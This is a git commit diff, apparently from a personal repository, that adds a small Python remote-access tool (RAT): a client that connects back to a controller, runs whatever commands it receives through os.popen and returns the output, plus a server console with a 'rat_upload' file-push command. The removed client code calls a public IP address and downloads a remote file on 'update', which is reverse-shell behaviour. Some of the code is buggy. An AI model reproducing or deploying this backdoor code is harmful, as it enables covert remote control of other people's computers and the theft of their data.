fab5c4be82d225c7abf1743703060af27e8cb73d
miclay0260 <79045167+miclay0260@users.noreply.github.com>
2021-02-15 19:32:53 +0400

    Add files via upload

--- client.py
+++ client.py
@@ -1,26 +1,41 @@
 import socket
 import os
 import time
-import wget
-while True:
-    try:
-        sock = socket.socket()
-        sock.connect(("109.169.239.111", 9696))
-        while True:
-            try:
-                data = sock.recv(1024).decode()  # получаем команду
-                aa = os.popen(data)
-                result = aa.read()
-                if data == "probe":
-                    sock.send(" ".encode())  # в случае, если рзультат
-                elif data == "update":
-                    sock.send("Updating..".encode())  # в случае, если рзультат
-                    URL = 'https://proprikol.ru/wp-content/uploads/2019/11/kartinki-anime-s-ushkami-3.jpg'
-                    wget.download(url, '/')
-                else:
-                    sock.send(result.encode())  # отправляем результат
-            except:
-                break
-    except:
-        time.sleep(25)
-        continue
+
+sock = socket.socket()
+sock.connect(("192.168.1.47", 9898))
+
+def recvfile():
+    i = 1
+    f = open(sock.recv(1024), 'wb')  # Open in binary
+    i = i + 1
+    while True:
+        # Recibimos y escribimos en el fichero
+        l = sock.recv(1024)
+        while (l):
+            f.write(l)
+            l = sock.recv(1024)
+def main():
+    while True:
+        try:
+            sock = socket.socket()
+            sock.connect(("0.0.0.0", 9898))
+            while True:
+                try:
+                    data = sock.recv(1024).decode()  # получаем команду
+                    if data == "uploadfile":
+                        recvfile()
+                    else:
+                        continue
+                    aa = os.popen(data)
+                    result = aa.read()
+                    if len(result) == 0:
+                        sock.send(" ".encode())  # в случае, если рзультат
+                        # пустой, отправляем пробел
+                    else:
+                        sock.send(result.encode())  # отправляем результат
+                except:
+                    break
+        except:
+            time.sleep(10)
+            continue
---
+++ nserver.py
@@ -0,0 +1,41 @@
+import socket
+
+sc = socket.socket()
+sc.bind(("", 9898))
+sc.listen(3)
+conn, addr = sc.accept()
+print ('connected:', addr)
+def refuse():
+    conn.close()
+    exit()
+
+def uploadfile():
+    path = input("[PATH] -> ")
+    cliname = input("[NAME ON CLIENT] -> ")
+    conn.send(cliname.encode())
+    print(path + " " + cliname)
+    fl = open(path, "rb")
+    l = fl.read(1024)
+    while (l):
+        conn.send(l)
+        l = fl.read(1024)
+
+def commands():
+    while True:
+        try:
+            comm = input("[COMM] -> ")
+            if len(comm) <= 0:
+                commands()
+            elif comm == "rat_upload":
+                conn.send("uploadfile".encode())
+                uploadfile()
+            elif comm == "refuse":
+                refuse()
+            else:
+                conn.send(comm.encode())
+                print (conn.recv(1024).decode())
+        except:
+            print ("CONNECTION REFUSED!")
+            conn.close()
+            break
+commands()
